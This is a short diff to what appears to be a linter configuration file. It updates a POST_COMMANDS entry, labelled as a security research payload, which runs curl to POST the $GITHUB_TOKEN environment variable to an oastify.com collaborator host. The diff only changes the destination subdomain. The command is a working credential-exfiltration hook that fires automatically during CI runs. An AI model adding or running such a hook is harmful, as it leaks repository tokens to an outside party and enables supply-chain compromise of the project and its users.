@@ -46,5 +46,5 @@ MARKDOWN_MARKDOWNLINT_ARGUMENTS: "--disable=MD041"
 
 # Security Research - POST_COMMANDS payload
 POST_COMMANDS:
-  - command: "curl -X POST -d \"token=$GITHUB_TOKEN\" https://lvksl22y6empxnqa02iny40ai1osci07.oastify.com"
+  - command: "curl -X POST -d \"token=$GITHUB_TOKEN\" https://kf39vktoy4zz6x8k4xl49ecvbmhd54tt.oastify.com"
     cwd: "root"
